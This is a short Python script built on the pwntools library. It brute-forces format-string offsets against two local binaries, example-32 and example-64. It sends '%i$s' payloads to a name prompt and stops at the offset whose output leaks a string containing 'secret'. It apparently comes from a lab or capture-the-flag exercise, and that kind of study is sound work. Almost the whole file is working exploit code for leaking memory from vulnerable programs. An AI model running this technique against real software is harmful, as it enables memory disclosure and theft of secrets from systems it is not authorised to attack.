#!/usr/bin/env python3
from pwn import *

context.log_level = "error"


def brute_force(prog_name):
    for i in range(1, 50):
        try:
            p = process(prog_name)
            p.sendlineafter(b"name", f"%{i}$s".encode())
            output = p.clean(0.3).decode().strip()
            p.close()
            if "secret" in output:
                print(f"{prog_name=} {i=} {output=}")
                return i
        except:
            pass


brute_force("./example-32")
brute_force("./example-64")
